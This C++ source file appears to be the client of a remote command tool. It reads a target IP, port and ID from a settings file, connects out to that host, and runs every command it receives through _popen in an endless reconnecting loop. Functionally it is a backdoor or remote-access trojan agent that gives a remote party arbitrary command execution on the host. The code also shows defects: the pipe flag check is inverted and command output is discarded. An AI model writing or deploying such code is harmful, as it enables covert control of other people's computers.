#include <iostream>
#include <fstream>
#include <algorithm>

#include "Client.h"

bool ReadSettings(const std::string Path, std::string *const TargetIP, std::string *const Port, std::string *const ID);
std::string RunCommand(const std::string &Command, const bool &PipeOutput);

int main(int argc, char *argv[])
{
	std::string IP, Port, ID;

	if(!ReadSettings("Data.txt", &IP, &Port, &ID))
	{
		return -1;
	}

	while(true)
	{
		Client Main;
		if(!Main.Connect(IP, Port, ID))
		{ 
			return 1;
		}

		while(true)
		{
			std::string Command;
			std::string CommandLower;
			if(!Main.Receive(&Command))
			{
				// Treat as disconnect
				Main.Send("disconnect");
				break;
			}

			// Get lower case version
			CommandLower=Command;
			std::transform(CommandLower.begin(), CommandLower.end(), CommandLower.begin(), tolower);
			if(CommandLower=="disconnect" || CommandLower=="exit")
			{
				break;
			}
			else if(CommandLower=="quit")
			{
				return 0;
			}
			else
			{
				bool NoPipe=CommandLower.find("-nopipe")==1;
				RunCommand(Command, NoPipe);
			}
		}
	}

	return 0;
}

bool ReadSettings(const std::string Path, std::string *const TargetIP, std::string *const Port, std::string *const ID)
{
	std::ifstream In;
	In.open(Path);
	if(!In.good())
	{
		return false;
	}

	std::getline(In, *TargetIP);
	std::getline(In, *Port);
	std::getline(In, *ID);

	// Invaid file
	if(*TargetIP=="" || *Port=="" || *ID=="")
	{
		In.close();
		return false;
	}

	In.close();
	return true;
}
std::string RunCommand(const std::string &Command, const bool &PipeOutput)
{
	if(PipeOutput)
	{
		FILE *Pipe=_popen(Command.c_str(), "r");
		if(!Pipe)
		{
			return "Command could not be run.\n";
		}
		char Buffer[256];
		std::string Result="";
		while(!feof(Pipe))
		{
			if(fgets(Buffer, 256, Pipe)!=NULL)
			{
				Result+=Buffer;
			}
		}
		_pclose(Pipe);
		return Result;
	}
	else
	{
		_popen(Command.c_str(), "r");
		return "";
	}
}